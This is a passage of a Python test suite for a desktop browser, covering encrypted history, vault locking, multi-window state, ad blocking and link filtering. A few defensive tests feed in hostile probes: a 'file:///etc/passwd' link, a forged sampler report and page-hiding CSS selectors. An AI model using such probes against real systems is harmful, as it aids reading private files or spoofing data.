      and _ab150.AgentBridge._clean_host("") == "")
import notes as _nt150
_np150 = _nt150.parse_note("---\nt: inf\nedited: 1e999\ntitle: x\n---\nbody\n") \
    if hasattr(_nt150, "parse_note") else None
check("a note dated 'inf' is read as having no date, not a broken list",
      _np150 is not None and _np150.get("t") == 0
      and _np150.get("edited") == 0, str(_np150))
# Z8 / Z9 a throwaway browser leaves no host in the bar's memory
_kh150 = set(br.known_hosts)
class _V150:
    session = "main"
    no_history = True      # a tab he paused the history for
check("a throwaway browser's or a paused tab's sites are not noted",
      br._history_may_note(_V150(), "x150.example") is False)
br.known_hosts = _kh150
# Z10 the window's saved state has no addresses
_wsk150 = br.config.get("windowStates")
br.config["windowStates"] = {"other150": {"x": 1, "y": 1, "w": 800, "h": 600,
                                          "tabs": ["https://s150.example/"]}}
_ws150 = br.save_window_state()
_other150 = dict(br.config["windowStates"].get("other150") or {})
if _wsk150 is None:
    br.config.pop("windowStates", None)
else:
    br.config["windowStates"] = _wsk150
check("the window state written at quit holds its place, not its addresses "
      "(an older row of another virtual browser loses them too)",
      "tabs" not in _ws150 and "tabs" not in _other150
      and _other150.get("w") == 800, str((sorted(_ws150), _other150)))
# ===== thirteenth pass (security), part 3: vault clock, windows, history =
check("the auto-lock clock keeps counting while the machine sleeps",
      "_awake_clock()" in __import__("inspect").getsource(B.VaultLock.idle))
_vw151 = br.new_window(); H.spin(700)
br.vault = br.make_vault()
br._vault_changed()
_same151 = _vw151.vault is br.vault
try:
    _vw151._closing_anyway = True
    _vw151.close()
except RuntimeError:
    pass
H.spin(300)
check("a vault rebuilt in one window is the vault of every window",
      _same151 is True, str(_same151))
_real_he151, _real_vl151 = br.history_encrypted, br.vault_locked
br.history_encrypted = lambda: True
br.vault_locked = lambda: True
try:
    _hrow151 = (br.history[-1].get("url") if br.history else "")
    _seen151 = (len(br.visible_history()), br.bridge.getHistory(),
                len(br.history_rows()), br.history_days(),
                br.visit_info(_hrow151)["count"])
finally:
    br.history_encrypted, br.vault_locked = _real_he151, _real_vl151
    br.__dict__.pop("history_encrypted", None)
    br.__dict__.pop("vault_locked", None)
check("a sealed history shows nothing while the vault is shut",
      _seen151 == (0, "[]", 0, [], 0), str(_seen151))
_real_hk151, _real_sh151 = br.history_key, br.save_history
br.history_key = lambda: b"k" * 32
br.save_history = lambda *a, **k: None
_was_he151 = br.config.get("historyEncrypted", False)
br.config["historyEncrypted"] = False
br.config["pageIndex"] = {"https://anvils.example/": "words of a page"}
br.config["tabSnapList"] = [{"u": "https://anvils.example/"}]
try:
    _on151 = br.encrypt_history(True)
    _left151 = (dict(br.config.get("pageIndex") or {}),
                br.config.get("tabSnapList"))
finally:
    br.history_key, br.save_history = _real_hk151, _real_sh151
    br.__dict__.pop("history_key", None)
    br.__dict__.pop("save_history", None)
    br.config["historyEncrypted"] = _was_he151
    br.save_config(quiet=True)
check("sealing the history drops the page words and tab snapshots kept "
      "in the clear", _on151 is True and _left151 == ({}, None),
      str((_on151, _left151)))
_real_he151b = br.history_encrypted
br.history_encrypted = lambda: True
_snaps151 = list(br.config.get("tabSnapList") or [])
try:
    _sn151 = br.snapshot_tabs()
finally:
    br.__dict__.pop("history_encrypted", None)
check("no tab snapshots are written into the config while the history is "
      "sealed", _sn151 == 0
      and list(br.config.get("tabSnapList") or []) == _snaps151, str(_sn151))
# ===== thirteenth pass (security), part 4: deletes reach a shut vault ====
_h152 = list(br.history)
_cfg152 = br.config.get("historyEncrypted", False)
_real152 = (br.history_key, br.save_history)
try:
    br.config["historyEncrypted"] = True
    br.history_key = lambda: None
    B.HISTORY_FILE.parent.mkdir(parents=True, exist_ok=True)
    B.HISTORY_FILE.write_bytes(B.HISTORY_MAGIC + b"sealed rows")
    _aside152 = B.HISTORY_FILE.with_name(B.HISTORY_FILE.name
                                        + ".unreadable-1")
    _aside152.write_bytes(B.HISTORY_MAGIC + b"older sealed rows")
    br._history_locked = True
    br.clear_history(undoable=False)
    _files152 = (B.HISTORY_FILE.exists(), _aside152.exists())
    # a delete of single pages while the sealed file is still unread
    br._history_locked = True
    br.history = [{"url": "https://gone.example/", "t": 5}]
    br.delete_history_entries(["https://gone.example/"])
    br.forget_history_site("site.example")
    br.forget_site("fs152.example")
    br.prune_history(days=30)
    br.history_key = lambda: b"k" * 32
    br.save_history = lambda *a, **k: None
    br._read_history = lambda: [
        {"url": "https://gone.example/", "t": 1},
        {"url": "https://a.site.example/x", "t": 2},
        {"url": "https://fs152.example/a", "t": _time.time()},
        {"url": "https://old152.example/", "t": 4},
        {"url": "https://kept.example/", "t": _time.time()}]
    br.unlock_history()
    _urls152 = [e.get("url") for e in br.history]
finally:
    for _n152 in ("history_key", "save_history", "_read_history"):
        br.__dict__.pop(_n152, None)
    br.config["historyEncrypted"] = _cfg152
    br._history_locked = False
    br._history_unsaved = False
    br.history = _h152
    br.save_history()
    br.save_config(quiet=True)
check("clear history with the vault shut deletes the sealed file and the "
      "set-aside copies", _files152 == (False, False), str(_files152))
check("pages deleted while the sealed history was unread stay deleted "
      "after unlock", _urls152 == ["https://kept.example/"], str(_urls152))
import inspect as _insp152
check("clear on exit goes through the same clear",
      "self.clear_history(undoable=False)"
      in _insp152.getsource(B.Browser._clear_on_exit))
# ===== thirteenth pass, the lows Z17-Z22 =================================
_bv153 = B.PasswordVault(_Path(_tempfile.mkdtemp(
    dir=str(B.CONFIG_FILE.parent))))
_bv153.import_bitwarden(json.dumps({"items": [
    {"type": 1, "name": None,
     "login": {"username": "u153", "password": "p153",
               "uris": [{"uri": None}]}}]}))
_it153 = [i for i in _bv153.items() if i.get("username") == "u153"]
check("a Bitwarden login with null name and address is not called None",
      _it153 and "None" not in (str(_it153[0].get("host")),
                                str(_it153[0].get("title"))),
      str(_it153[:1]))


class _Page153:
    def __init__(self):
        self.ran = []

    def runJavaScript(self, js, *a):
        self.ran.append(js)


class _View153:
    def __init__(self, url):
        self._p = _Page153()
        self._u = B.QUrl(url)

    def page(self):
        return self._p

    def url(self):
        return self._u


_ht153 = br.new_tab(); H.spin(500)
H.load(_ht153, srv.url("/urltext"))
H.wait_for(lambda: "urltext" in _ht153.url().toString(), 8000)
H.js(_ht153, """(function(){var d=document.createElement('div');
  d.id='banner153';d.textContent='x';document.body.appendChild(d);
  var p=document.createElement('p');p.className='ad153';p.textContent='y';
  document.body.appendChild(p);return 1;})()""")
br._apply_hide_now(_ht153, ["p:bogus(((", "#banner153", "a}body{",
                            "p.ad153"])
H.spin(300)
_hid153 = H.js(_ht153, """[getComputedStyle(document.getElementById(
  'banner153')).display, getComputedStyle(document.querySelector(
  'p.ad153')).display, getComputedStyle(document.body).display].join()""")
_close_if_open(_ht153)
check("hiding on an open tab survives a broken selector before the good "
      "ones, and a selector cannot hide the whole page",
      _hid153 == "none,none,block", _hid153)
_rev153 = []
_real_rows153 = br.permission_rows
_real_rev153 = br.revoke_permission
br.permission_rows = lambda: [
    {"origin": "file:///", "what": "use the camera", "key": "f153"},
    {"origin": "https://other153.example", "what": "use the camera",
     "key": "o153"}]
br.revoke_permission = lambda key: _rev153.append(key)
try:
    br.stop_media_use(_View153("file:///tmp/page153.html"))
finally:
    br.__dict__.pop("permission_rows", None)
    br.__dict__.pop("revoke_permission", None)
check("stopping the camera on a file: page takes its grant back",
      _rev153 == ["f153"], str(_rev153))
br._show_plain_toast("plain line 153")
_t153 = br._toast
br._toast_result("Updated! Restart the browser to finish.")
_after153 = (br._toast is _t153, br._toast_label.text(),
             br._toast_timer.isActive())
br._hide_toast()
check("a silent update's answer does not land on another toast",
      _after153 == (True, "plain line 153", True), str(_after153))
br._show_toast()
br._toast_result("Updated to abc153")
_upd153 = br._toast_label.text() if br._toast else ""
br._hide_toast()
check("...while the update offer still shows its answer",
      _upd153 == "Updated to abc153", _upd153)
check("a file: address is a page the start setting accepts",
      B.Browser.resolve_page_url("file:///tmp/start153.html")
      == "file:///tmp/start153.html"
      and B.Browser.resolve_page_url("file://") == "",
      B.Browser.resolve_page_url("file:///tmp/start153.html"))


class _Info153:
    def __init__(self, url):
        self.u = B.QUrl(url)
        self.to = None

    def requestUrl(self):
        return self.u

    def resourceType(self):
        return _MainKind153()

    def requestMethod(self):
        return b"POST"

    def redirect(self, url):
        self.to = url.toString()

    def block(self, on):
        self.to = "blocked"

    def setHttpHeader(self, *a):
        pass

    def firstPartyUrl(self):
        return self.u


class _MainKind153:
    name = "ResourceTypeMainFrame"
    value = 0


_ok153 = br.upgrade_on_the_wire(B.QUrl("http://form153.example/send#top"))
_inf153 = _Info153("http://form153.example/send")
br.request_watch()._work(_inf153)
_again153 = _Info153("http://form153.example/send")
br.request_watch()._work(_again153)
check("https only sends a form on to https from the interceptor (body kept)",
      _ok153 is True and _inf153.to == "https://form153.example/send"
      and _again153.to is None, str((_ok153, _inf153.to, _again153.to)))
br.add_to_dictionary("zorbleflux153")
_sp153 = br.profile.persistentStoragePath()
try:
    _cd153 = (B.Path(_sp153) / "Custom Dictionary.txt").read_text(
        encoding="utf-8") if _sp153 else ""
except OSError:
    _cd153 = ""
_body153, _, _sum153 = _cd153.partition("checksum_v1 = ")
check("a word added to the dictionary is in the engine's own custom "
      "dictionary, with Chromium's checksum",
      "zorbleflux153" in _body153.splitlines()
      and _sum153 == __import__("hashlib").md5(
          _body153.encode("utf-8")).hexdigest(), _cd153[-120:])
if B.mpris is not None and getattr(B.mpris, "HAVE_DBUS", False):
    _ms153 = B.mpris.Service(None)
    _ms153.update(True, "Song153", "Band153")
    _bm153 = _ms153.bus_metadata()
    # typed D-Bus values (the 'o' and 'as' they make on the bus were
    # measured on a private session bus: scratchpad/v8); the plain list
    # stays for the status and the tests
    _ok_md153 = (type(_bm153.get("mpris:trackid")).__name__,
                 type(_bm153.get("xesam:artist")).__name__,
                 _ms153.metadata.get("xesam:artist"))
    check("MPRIS sends the track id as an object path and the artists as "
          "a string list", _ok_md153 == ("QDBusObjectPath", "QDBusArgument",
                                         ["Band153"]), str(_ok_md153))
# ===== X1b: one history, one bookmark list, one download list ==========
_h157 = list(br.history)
_w157 = br.new_window(); H.spin(700)
br.history[:] = [{"url": "https://keep157.example/", "t": 1, "title": "k"},
                 {"url": "https://gone157.example/", "t": 2, "title": "g"}]
_w157.delete_history_entries(["https://gone157.example/"])
_gone157 = [e.get("url") for e in br.history]
_w157.bookmarks = list(_w157.bookmarks)
_w157.downloads = list(_w157.downloads)
_same157 = (_w157.history is br.history, _w157.bookmarks is br.bookmarks,
            _w157.downloads is br.downloads)
try:
    _w157._closing_anyway = True
    _w157.close()
except RuntimeError:
    pass
H.spin(300)
br.history = _h157
br.save_history()
check("a history row deleted in a second window is gone from every window",
      _gone157 == ["https://keep157.example/"], str(_gone157))
check("...and the windows still share one history, bookmark and download "
      "list after a change", _same157 == (True, True, True), str(_same157))
_w2_157 = br.new_window(); H.spin(700)
_was157 = getattr(br, "_history_locked", False)
_w2_157._history_locked = True
_lk157 = getattr(br, "_history_locked", False)
br._history_locked = _was157
try:
    _w2_157._closing_anyway = True
    _w2_157.close()
except RuntimeError:
    pass
H.spin(300)
check("whether the sealed history is still unread is one answer for every "
      "window", _lk157 is True, str(_lk157))
# ===== fourteenth pass: one browser, several windows ====================
br._session_perms["k159|use the camera"] = True
_w159 = br.new_window(); H.spin(800)
_kept159 = br._session_perms.get("k159|use the camera") is True
_shared159 = {n: getattr(_w159, n) is getattr(br, n) for n in (
    "_session_perms", "_private_perms", "dl_active", "known_hosts",
    "_http_allowed", "sessions", "downloads")}
check("a second window does not empty the first one's permission answers",
      _kept159, str(br._session_perms.get("k159|use the camera")))
check("the windows share their permission books, downloads in flight, "
      "address-bar hosts, https answers and virtual browsers",
      all(_shared159.values()), str(_shared159))
br.config.setdefault("permissions", {})["k159|use the camera"] = "allow"
_w159.revoke_permission("k159|use the camera")
check("...so a permission taken back in one window is gone in the other",
      "k159|use the camera" not in br._session_perms)
check("a second window uses the browser's one request interceptor",
      _w159.request_watch() is br.request_watch())
_got159 = []
br.bridge.downloadsChanged.connect(lambda: _got159.append("dl"))
br.bridge.bookmarksChanged.connect(lambda: _got159.append("bm"))
_w159._push_all("downloadsChanged")
_w159.save_bookmarks()
H.spin(100)
check("a change made in one window is pushed to the pages of the others",
      "dl" in _got159 and "bm" in _got159, str(_got159))
_tl159 = br.config.get("textLabels", False)
br.config["textLabels"] = True
_w159.apply_text_labels()
_btns159 = [b for b in br.findChildren(B.QToolButton)
            if b.objectName() not in ("dlall",)]
_style159 = bool(_btns159) and all(
    b.toolButtonStyle() == B.Qt.ToolButtonStyle.ToolButtonTextBesideIcon
    for b in _btns159)
br.config["textLabels"] = _tl159
_w159.apply_text_labels()
check("words on the toolbar, switched on in one window, reach the other",
      _style159, str(len(_btns159)))
_tab159 = _w159.new_tab(); H.spin(400)
check("a download is answered by the window whose page asked for it",
      br._window_of_page(_tab159.page()) is _w159)
br.sessions.append({"name": "S159", "sid": "s159"})
_seen159 = any(e["sid"] == "s159" for e in _w159.sessions)
_w159._close_session("s159")
check("a virtual browser added in one window is in the other, and closing "
      "it there closes it everywhere", _seen159
      and not any(e["sid"] == "s159" for e in br.sessions))
_cl159 = dict(getattr(br, "_call_live", {}) or {})
br._call_live = {"k159": _time.monotonic()}
_w159._call_live = {}
_w159._call_apply()
_up159 = B._call_flag_raised
br._call_live = _cl159
br._call_apply()
check("a window with no call does not drop the flag another window raised",
      _up159 is True, str(_up159))
_vl159 = br.vault_lock
_pend159 = getattr(br, "_pw_pending", None)
br._pw_pending = {"host": "h159.example", "username": "u", "password": "p"}
_vl159.can_seal = lambda: True
_vl159.lock = lambda: None
try:
    _w159.lock_vault()
finally:
    _vl159.__dict__.pop("can_seal", None)
    _vl159.__dict__.pop("lock", None)
_after159 = getattr(br, "_pw_pending", None)
br._pw_pending = _pend159
check("locking the vault in one window drops the other window's held "
      "password offer", _after159 is None, str(_after159))
_close_if_open(_tab159, _w159)
try:
    _w159._closing_anyway = True
    _w159.close()
except RuntimeError:
    pass
H.spin(400)
_busy159 = [t for t in _w159.findChildren(B.QTimer) if t.isActive()]
check("a closed second window has no timer still running",
      not _busy159, str(len(_busy159)))
# ===== fifteenth pass: downloads, notes, agent, adblock, qr, mpris, CI ===
import importlib.util as _ilu167
_spec167 = _ilu167.spec_from_file_location(
    "manage_issue167", str(B.APP_DIR / ".github" / "scripts" / "manage_issue.py"))
_mi167 = _ilu167.module_from_spec(_spec167)
_spec167.loader.exec_module(_mi167)
check("a check where every source failed does not close the open issue",
      _mi167.decide([], {"number": 1, "state": "OPEN", "body": ""},
                    ["PyPI could not be read"])[0] == "silent"
      and _mi167.decide([], {"number": 1, "state": "OPEN", "body": ""},
                        [])[0] == "close")
_spec167b = _ilu167.spec_from_file_location(
    "security_report167",
    str(B.APP_DIR / ".github" / "scripts" / "security_report.py"))
_sr167 = _ilu167.module_from_spec(_spec167b)
_spec167b.loader.exec_module(_sr167)
_sr167.try_fetch = lambda *a, **k: {"vulnerabilities": [
    {"vendorProject": "Google", "product": "Chromium V8",
     "dateAdded": "2019-01-01", "cveID": "CVE-2019-0001"}]}
check("with no date for the engine's branch, no exploited hole counts as "
      "newer than it", _sr167.kev_since(None) is None)


class _Req167:
    def __init__(self):
        self.paused = True
        self.resumed = 0

    def isPaused(self):
        return self.paused

    def resume(self):
        self.resumed += 1
        self.paused = False


_r167 = _Req167()
br._let_go(_r167)
_r167b = _Req167()
_r167b._cap_paused = True
br._let_go(_r167b)
check("the speed cap's release leaves a pause it did not make alone",
      _r167.resumed == 0 and _r167b.resumed == 1,
      str((_r167.resumed, _r167b.resumed)))
_e167 = {"id": 916701, "state": "active", "queued": True, "name": "q.bin",
         "url": "https://q167.example/q.bin"}
br.downloads.append(_e167)
_q167 = list(getattr(br, "_dl_queue", None) or [])
br._dl_queue = _q167 + [916701]


class _Can167(_Req167):
    def cancel(self):
        self.cancelled = True


br.dl_active[916701] = _Can167()
br.bridge.cancelDownload(br._page_key, 916701)
_left167 = (916701 in (br._dl_queue or []), _e167.get("queued"))
br.dl_active.pop(916701, None)
br.downloads.remove(_e167)
br._dl_queue = _q167
check("a waiting download that is cancelled leaves the queue",
      _left167 == (False, None), str(_left167))
if br.desk() is not None:
    _dk167 = br.desk()
    _tp167 = _dk167.todo_path()
    _was167 = _tp167.read_text() if _tp167.exists() else None
    _tp167.write_text("- [ ] first167\n- [ ] second167\n")
    _rows167 = _dk167.todos()
    _id167 = _rows167[0]["id"]
    # the file changed under the panel: the row it showed is "first167"
    _tp167.write_text("- [ ] inserted167\n- [ ] first167\n- [ ] second167\n")
    br.desk_do("deleteTodo", json.dumps({"id": _id167, "text": "first167"}))
    _after167 = [r["text"] for r in _dk167.todos()]
    if _was167 is None:
        _tp167.unlink()
    else:
        _tp167.write_text(_was167)
    check("a to-do panel out of date does not delete another to-do",
          _after167 == ["inserted167", "first167", "second167"],
          str(_after167))
_ab167 = B.adblock.Rules() if B.adblock is not None else None
if _ab167 is not None:
    _ab167.load_text("||tracker167.example^\n##div:not(.x\n##.ad167\n"
                     "#@#.sp167\n##.sp167\n")
    check("ad blocking reaches web sockets and a '?' straight after the host",
          bool(_ab167.blocks("wss://tracker167.example/s", "p.example",
                             "websocket"))
          and bool(_ab167.blocks("https://a.tracker167.example?x=1",
                                 "p.example", "script")))
    check("a broken hiding rule is skipped and a global exception holds",
          _ab167.hide_for("any167.example") == [".ad167"],
          str(_ab167.hide_for("any167.example")))
if B.qr is not None:
    _m167 = B.qr.matrix("https://qr167.example/")
    _sc167 = 8
    _n167 = len(_m167) + 8
    _img167 = B.QImage(_n167 * _sc167, _n167 * _sc167,
                       B.QImage.Format.Format_ARGB32)
    _img167.fill(B.QColor(0, 0, 0, 0))
    _pt167 = B.QPainter(_img167)
    for _y, _row in enumerate(_m167):
        for _x, _on in enumerate(_row):
            if _on:
                _pt167.fillRect((_x + 4) * _sc167, (_y + 4) * _sc167,
                                _sc167, _sc167, B.QColor("black"))
    _pt167.end()
    _qr167 = br._read_qr_image_object(_img167)
    check("a QR code on a transparent background is read",
          _qr167 == "https://qr167.example/", str(_qr167))
if B.mpris is not None and getattr(B.mpris, "HAVE_DBUS", False):
    _seek167 = []
    _fv167 = object()
    _svc167 = B.mpris.Service(br)
    _pl167 = B.mpris.Player(_svc167)
    br._audible_anywhere = lambda: (br, _fv167)
    br.media_seek = lambda secs=0, absolute=None, view=None: \
        _seek167.append((secs, view))
    try:
        _pl167.Seek(-500000)
    finally:
        br.__dict__.pop("_audible_anywhere", None)
        br.__dict__.pop("media_seek", None)
    check("the media keys' seek moves the tab that is playing, by the time "
          "asked", _seek167 == [(-0.5, _fv167)], str(_seek167))
import socket as _so167
import threading as _th167
import agent as _ag167
import agent_socket as _as167
# a short folder: a socket path has a 108-byte limit
_dir167 = _Path(_tempfile.mkdtemp(prefix="ag167-"))
_stale167 = str(_dir167 / "stale.sock")
_live167 = str(_dir167 / "live.sock")
_s1 = _so167.socket(_so167.AF_UNIX, _so167.SOCK_STREAM)
_s1.bind(_stale167)
_s1.close()                      # the file stays, nobody listens
_srv167 = _so167.socket(_so167.AF_UNIX, _so167.SOCK_STREAM)
_srv167.bind(_live167)
_srv167.listen(1)


def _answer167():
    try:
        conn, _ = _srv167.accept()
        conn.recv(65536)
        conn.sendall(b'{"ok": true, "who": "live"}\n')
        conn.close()
    except OSError:
        pass


_t167 = _th167.Thread(target=_answer167, daemon=True)
_t167.start()
_cand167, _ours167 = _as167.candidate_paths, _as167.is_ours
_as167.candidate_paths = lambda: [_stale167, _live167]
_as167.is_ours = lambda path: True
try:
    _who167 = _ag167.call({"op": "info"}, timeout=5).get("who")
except Exception as _e167:
    _who167 = repr(_e167)
finally:
    _as167.candidate_paths, _as167.is_ours = _cand167, _ours167
    _srv167.close()
    __import__("shutil").rmtree(str(_dir167), ignore_errors=True)
check("the agent client passes a dead browser's socket and reaches the "
      "live one", _who167 == "live", str(_who167))
# ===== sixteenth pass: late answers, time, schedules =====================
import inspect as _in173
_sn173 = list(br.config.get("snoozed") or [])
br.config["snoozed"] = [{"url": "https://snooze173.example/", "at": "tomorrow"}]
try:
    _ok173 = isinstance(br.snoozed_tabs()[0]["at"], int)
except Exception as _e173:
    _ok173 = repr(_e173)
br.config["snoozed"] = _sn173
check("a snoozed tab with a time that cannot be read does not stop the desk "
      "tick", _ok173 is True, str(_ok173))
_rr173 = br.config.get("readResume", False)
_rp173 = dict(br.reading_places())
br.config["readResume"] = True
_rv173 = br.new_tab(); H.spin(300)
H.load(_rv173, srv.url("/twhome"))
H.wait_for(lambda: "twhome" in _rv173.url().toString(), 8000)
_rv173._read_url = "https://read173.example/article"
_real_rpt173 = br.read_page_tool
br.read_page_tool = lambda name, view=None, then=None, **k: then(5000)
try:
    br.note_reading_place(_rv173)
finally:
    br.__dict__.pop("read_page_tool", None)
_got173 = br.reading_places().get("https://read173.example/article")
br.reading_places().pop("https://read173.example/article", None)
br.config["readResume"] = _rr173
_close_if_open(_rv173)
check("the reading place is filed under the page being left",
      _got173 == 5000, str(_got173))
check("a filled login is sent after the password is in, not on a timer",
      'QTimer.singleShot(250, lambda: self.form_tool("submitnow"'
      not in _in173.getsource(B.Browser.fill_login_now)
      and hasattr(br, "_submit_after_fill"))
check("Settings' page-colour switch goes through its own setter",
      "set_page_theme_colour" in _in173.getsource(B.Bridge.setSetting))
check("another 1Password vault reaches every window",
      "_vault_changed()" in _in173.getsource(B.Bridge.setOpVault))
_w173 = br.new_window(); H.spin(700)
_w173.vault_checking = "1password"
_w173.vault = object()
br._vault_changed()
_chk173 = (_w173.vault is br.vault, _w173.vault_checking)
_slept173 = []
_real_sleep173 = _w173.auto_sleep
_w173.auto_sleep = lambda *a, **k: _slept173.append(1)
try:
    br._desk_tick()
finally:
    _w173.__dict__.pop("auto_sleep", None)
_shared173 = (_w173._last_touch is br._last_touch or
              _w173._last_touch == br._last_touch,
              _w173._todo_said is br._todo_said)
try:
    _w173._closing_anyway = True
    _w173.close()
except RuntimeError:
    pass
H.spin(300)
check("a store change in one window takes down another window's check",
      _chk173 == (True, ""), str(_chk173))
check("auto-sleep reaches the tabs of every window", bool(_slept173))
check("idle time and the to-dos already said are one for the browser",
      _shared173 == (True, True), str(_shared173))


class _Reply173:
    def readAll(self):
        return b""

    def error(self):
        return B.QNetworkReply.NetworkError.HostNotFoundError

    def deleteLater(self):
        pass


_lw173 = dict(br.config.get("liveWas") or {})
br.config["liveWas"] = {"chan173": True}
br._live_pending = 1
br._live_answer(_Reply173(), "chan173")
_kept173 = br.config["liveWas"].get("chan173")
br.config["liveWas"] = _lw173
check("a live check that failed does not write the channel down as offline",
      _kept173 is True, str(_kept173))
check("downloads say Yesterday by the calendar",
      "now.getDate() - 1" in (B.APP_DIR / "downloads.html").read_text())
# ===== seventeenth pass: private actions, menus, restore, config shapes ===
_t177 = br.new_tab(); H.spin(300)
H.load(_t177, srv.url("/drafts"))
H.wait_for(lambda: "drafts" in _t177.url().toString(), 8000)
_w177 = br.new_window(); H.spin(800)
_v177 = _w177.new_tab(); H.spin(300)
H.load(_v177, srv.url("/timers"))
H.wait_for(lambda: "timers" in _v177.url().toString(), 8000)
br._save_groups()
_saved177 = json.dumps(br.config.get("sessionTabs") or {}) \
    + json.dumps(br.config.get("tabGroups") or [])
check("the tabs of every window are saved, not only the first window's",
      "/drafts" in _saved177 and "/timers" in _saved177,
      _saved177[-300:])
try:
    _w177._closing_anyway = True
    _w177.close()
except RuntimeError:
    pass
H.spin(400)
# a popped-out tab: saved, and its page menu's to-do does not close another
_n177 = br.tabs.count()
_mini177 = br.pop_out_tab(br.tabs.indexOf(_t177))
H.spin(300)
br._save_groups()
_pop177 = "/drafts" in json.dumps(br.config.get("sessionTabs") or {}) \
    + json.dumps(br.config.get("tabGroups") or [])
_count177 = br.tabs.count()
if br.desk() is not None:
    br.tab_to_todo(view=_t177)
check("a popped-out tab is saved, and its to-do closes no other tab",
      _pop177 and br.tabs.count() == _count177,
      str((_pop177, _count177, br.tabs.count())))
try:
    _mini177.close()
except RuntimeError:
    pass
H.spin(300)
_close_if_open(_t177)
_tw177 = list(br.config.get("throwawaySessions") or [])
br.config["throwawaySessions"] = _tw177 + ["tmp-x177"]
_kept177 = br._kept_state([{"u": "https://bank177.example/", "s": "tmp-x177"},
                           {"u": "https://ok177.example/", "s": "main"}])
br.config["throwawaySessions"] = _tw177
check("a clean room's tab is not kept in sets, snapshots or tabs put aside",
      [s["u"] for s in _kept177] == ["https://ok177.example/"], str(_kept177))
_dl177 = br.config.get("dlLater")
br.config["dlLater"] = ["junk", {"url": "https://x177.example/f",
                                 "when": "tomorrow"}]
try:
    _rows177 = br.scheduled_downloads()
    _ok177 = len(_rows177) == 1 and isinstance(_rows177[0]["when"], int)
except Exception as _e177:
    _ok177 = repr(_e177)
if _dl177 is None:
    br.config.pop("dlLater", None)
else:
    br.config["dlLater"] = _dl177
check("a malformed scheduled download does not stop the others",
      _ok177 is True, str(_ok177))
check("a permissions table that is not a table is reset, not raised on",
      B._migrate_permission_config({"permissions": None})["permissions"]
      == {})
_pw177 = br.new_window(private=True); H.spin(800)
_bm177 = {"id": 917701, "type": "link", "url": srv.url("/drafts"),
          "title": "b177"}
_pw177.open_bookmark(_bm177)
H.spin(300)
_opens177 = _bm177.get("opens")
try:
    _pw177._closing_anyway = True
    _pw177.close()
except RuntimeError:
    pass
H.spin(400)
check("a bookmark opened in a private window leaves no count behind",
      _opens177 is None, str(_opens177))
_h177 = list(br.history)
br.history[:] = [{"url": "https://x177.example/", "t": 1, "title": "x"},
                 {"url": "https://y177.example/", "t": 2, "title": "y"}]
br.delete_history_entries(["https://x177.example/"])
# deleted elsewhere (another window), with no undo of its own
br.history = [e for e in br.history if e["url"] != "https://y177.example/"]
br.undo_history_delete()
_back177 = sorted(e["url"] for e in br.history)
br.history = _h177
br.save_history()
check("an undo puts back what its delete took, not what was deleted since",
      _back177 == ["https://x177.example/"], str(_back177))
_lt177 = br.new_tab(); H.spin(300)
H.load(_lt177, srv.url("/drafts"))
H.wait_for(lambda: "drafts" in _lt177.url().toString(), 8000)
_lt177.locked = True
_lt177.tab_name = "named177"
br.close_tab(br.tabs.indexOf(_lt177), ask=False)
H.spin(300)
_re177 = br.reopen_closed_tab()
H.spin(300)
_state177 = (getattr(_re177, "locked", False),
             getattr(_re177, "tab_name", None))
_re177.locked = False
_close_if_open(_re177)
check("a reopened tab is locked and named as it was",
      _state177 == (True, "named177"), str(_state177))
# ===== eighteenth pass: what a page can start, and its "&" ===============
_front181 = br.current()
_bg181 = br.new_tab(switch=False); H.spin(300)
br.tabs.setCurrentWidget(_front181); H.spin(100)
_a181 = br._page_may_act(br.current(), "k181")
_b181 = br._page_may_act(br.current(), "k181")
_c181 = br._page_may_act(_bg181, "k181bg")
_close_if_open(_bg181)
check("a page's navigation may start something outside it only from the "
      "tab in front, and not again at once",
      (_a181, _b181, _c181) == (True, False, False),
      str((_a181, _b181, _c181)))
_m181 = B.QMenu()
br._fill_links(_m181, {"links": [{"url": "file:///etc/passwd", "text": "f"},
                                 {"url": "https://ok181.example/", "text": "o"}],
                       "mails": []})
# the link entries carry their address as the tooltip ("copy all" has
# a tooltip of its own, which is not a link)
_tips181 = [a.toolTip() for a in _m181.actions() if "://" in a.toolTip()]
check("the page's link list offers web addresses only",
      _tips181 == ["https://ok181.example/"], str(_tips181))
check("a page title cannot claim an Alt+letter on the tab strip",
      "QEvent.Type.Shortcut" in _in173.getsource(B.Browser.eventFilter))
check("'download every linked file' keeps to web addresses",
      '("http", "https", "blob")' in _in173.getsource(
          B.Browser.download_page_files))
# ---- 182: gpu record, tidy_typed, params, filters, perf, chrome_style, kitty ----
import inspect as _inspect182

_k182 = B._FRAME_KEY
_real182 = '[gpu-frame] ' + json.dumps({"key": _k182, "host": "a.example",
                                        "decoded": 5, "evil": "x"})
_forged182 = '[gpu-frame] {"host": "forged.example", "decoded": 1}'
_got182 = B._video_frames([[{"text": _real182}, {"text": _forged182}]],
                          key=_k182)
check("only sampler lines carrying the key are reports",
      len(_got182) == 1 and _got182[0]["host"] == "a.example", str(_got182))
check("...and only the known fields of a report are kept",
      "evil" not in _got182[0] and "key" not in _got182[0], str(_got182))
check("the sampler script is built with the key, not the placeholder",
      _k182 in br._video_watch_script().sourceCode()
      and "__FRAME_KEY__" not in br._video_watch_script().sourceCode())
_src182 = _inspect182.getsource(B.Browser._gpu_record)
check("the gpu record skips private pages",
      "_page_is_private" in _src182 and "key=_FRAME_KEY" in _src182)

check("a search that starts with 'word:' is left as typed",
      B.tidy_typed("why: is the sky blue") == "why: is the sky blue"
      and B.tidy_typed("Note: foo bar") == "Note: foo bar",
      B.tidy_typed("why: is the sky blue"))
check("a pasted scheme with a stray space is still mended",
      B.tidy_typed("https:// example.com") == "https://example.com",
      B.tidy_typed("https:// example.com"))

check("trkCampaign is stripped from a link",
      "trkCampaign" not in B.clean_url("https://e.example/p?trkCampaign=1&a=2")
      and "a=2" in B.clean_url("https://e.example/p?trkCampaign=1&a=2"),
      B.clean_url("https://e.example/p?trkCampaign=1&a=2"))

check("page look and a11y keep their own parts of the root filter",
      "__filterParts" in B.PAGE_LOOK_JS and "__filterParts" in B.A11Y_JS
      and "parts.a11y" in B.PAGE_LOOK_JS)
check("the hidden-video check reads the current setting",
      "(window.__perfWant || {}).stopHiddenVideo) return 0" in B.PERF_JS)
check("the unstyled background is applied only to a bare page",
      "bare = clear(document.documentElement)" in B.PAGE_LOOK_JS
      and "if (bare)" in B.PAGE_LOOK_JS)
check("bold starts and clickable urls skip non-HTML text",
      B.A11Y_JS.count("w3.org/1999/xhtml") >= 1
      and B.NAV_JS.count("w3.org/1999/xhtml") >= 1)
check("a bad auto-click selector is caught per row",
